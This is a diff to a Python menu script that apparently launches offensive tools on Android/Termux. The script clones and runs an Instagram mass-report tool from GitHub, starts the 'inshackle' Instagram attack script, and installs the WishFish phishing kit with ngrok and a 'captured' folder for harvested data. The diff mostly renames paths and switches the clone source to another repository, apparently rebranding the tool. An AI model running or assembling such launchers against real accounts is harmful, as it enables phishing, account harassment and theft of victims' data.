@@ -16,11 +16,7 @@ from time import sleep
 
 R='\033[1;31m'
 g='\033[1;37m'
-G='\033[1;32m'
-
-Y='\033[1;33m'
-
-C='\033[1;36m'
+G='\033[1;32m'                                                                                                              Y='\033[1;33m'                                                                                                              C='\033[1;36m'
 
 W='\033[1;37m'
 
@@ -211,17 +207,17 @@ if droid == "1":
     system ('clear')
     print(R +'Please transfer the script to my file...:D')
     system('python yt.py')
-    system('python shit_k_pop.py')
+    system('python Dark.py')
 
 if droid == "2":
 
     system('clear')
 
-    system('git clone https://github.com/Ali-dds/Report-Instagram-')
+    system('git clone https://github.com/MrAli-s/Report-Instagram-')
 
     input (R +"Pleace Enter to Open... ")
 
-    system('python ~/Mr.Ali/Report-Instagram-/Report.py')
+    system('python ~/Dark.soul/Report-Instagram-/Report.py')
 
     exit()
 
@@ -269,7 +265,7 @@ if droid == "4":
 
   input (G +"Pleace Enter to Open... ")
 
-  system('bash ~/Mr.Ali/inshackle/inshackle.sh')
+  system('bash ~/Dark.soul/inshackle/inshackle.sh')
 
   exit()
 
@@ -326,11 +322,11 @@ print('''\033[1;32m `-----------------` ''')
 
 input (Y + "Pleace Enter to OpEn...")
 
-system('cp $PREFIX/bin/ngrok ~/Mr.Ali/WishFish')
+system('cp $PREFIX/bin/ngrok ~/Dark.soul/WishFish')
 
-system('mv ~/Mr.Ali/WishFish ~')
+system('mv ~/Dark.soul/WishFish ~')
 
-system('mv ~/WishFish/Custom.html ~/WishFish/LICENSE ~/WishFish/README.md ~/WishFish/captured ~/WishFish/copy.sh ~/WishFish/index.php ~/WishFish/index2.html ~/WishFish/ip.php ~/WishFish/post.php ~/WishFish/ngrok ~/WishFish/template.php ~/WishFish/wishfish.html ~/WishFish/wishfish.sh ~/Mr.Ali/')
+system('mv ~/WishFish/Custom.html ~/WishFish/LICENSE ~/WishFish/README.md ~/WishFish/captured ~/WishFish/copy.sh ~/WishFish/index.php ~/WishFish/index2.html ~/WishFish/ip.php ~/WishFish/post.php ~/WishFish/ngrok ~/WishFish/template.php ~/WishFish/wishfish.html ~/WishFish/wishfish.sh ~/Dark.soul/')
 
 system('rm -rf ~/WishFish')
 
